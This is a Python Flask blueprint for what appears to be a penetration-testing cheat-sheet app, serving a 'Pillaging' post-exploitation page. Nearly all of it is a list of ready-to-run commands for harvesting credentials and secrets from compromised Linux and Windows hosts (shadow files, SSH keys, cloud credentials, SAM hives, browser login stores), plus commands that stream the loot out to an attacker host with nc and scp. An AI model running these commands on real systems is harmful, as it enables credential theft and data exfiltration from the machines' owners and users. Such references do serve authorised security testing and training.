from flask import Blueprint, render_template

bp = Blueprint("pillaging", __name__)

CARDS = [
    {"title": "Linux — creds & secrets", "blocks": [
        {"tpl": "cat /etc/passwd; cat /etc/shadow 2>/dev/null"},
        {"tpl": "grep -rniE 'password|passwd|secret|api[_-]?key|token' /var/www /opt /home 2>/dev/null"},
        {"tpl": "find / -name '*.kdbx' -o -name 'id_rsa' -o -name '*.ovpn' 2>/dev/null"},
        {"tpl": "cat ~/.bash_history ~/.mysql_history 2>/dev/null"},
        {"tpl": "ls -la ~/.ssh; cat ~/.ssh/id_* 2>/dev/null"},
        {"tpl": "cat ~/.aws/credentials ~/.config/gcloud/* 2>/dev/null"},
    ]},
    {"title": "Linux — config & databases", "blocks": [
        {"tpl": "find / -name '*.conf' -o -name '*.config' -o -name '.env' 2>/dev/null | grep -vE '^/(proc|sys)'"},
        {"tpl": "mysql -u root -p -e 'show databases;'"},
        {"tpl": "sqlite3 <file.db> '.tables'"},
    ]},
    {"title": "Windows — creds & secrets", "blocks": [
        {"tpl": "reg query HKLM /f password /t REG_SZ /s"},
        {"tpl": "dir /s /b *.config *.xml *.ini *.txt 2>nul | findstr /i pass"},
        {"tpl": "cmdkey /list"},
        {"tpl": "type C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Credentials\\* 2>nul"},
        {"tpl": "findstr /si password *.xml *.ini *.config *.txt"},
    ]},
    {"title": "Windows — browser / DPAPI / SAM", "hint": "Grab offline, crack on $LHOST.", "blocks": [
        {"tpl": "reg save HKLM\\SAM sam.save & reg save HKLM\\SYSTEM system.save"},
        {"tpl": "type %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data"},
        {"tpl": "vaultcmd /listcreds:\"Windows Credentials\" /all"},
    ]},
    {"title": "Loot exfil to $LHOST", "blocks": [
        {"tpl": "tar czf - $OUT | nc $LHOST $LPORT", "lbl": "linux: stream out"},
        {"tpl": "scp -r loot $USER@$LHOST:$OUT"},
        {"tpl": "certutil -encode loot.zip loot.b64 & type loot.b64", "lbl": "windows: base64 paste"},
    ]},
]


@bp.route("/pillaging")
def index():
    return render_template("cheat.html", active="pillaging",
                           title="Pillaging", tag="post-exploit",
                           intro="Harvest credentials, keys, configs and data once you have a foothold.",
                           cards=CARDS)


MODULE = {"id": "pillaging", "title": "Pillaging", "category": "Post-exploit",
          "order": 4, "blueprint": bp, "endpoint": "pillaging.index"}
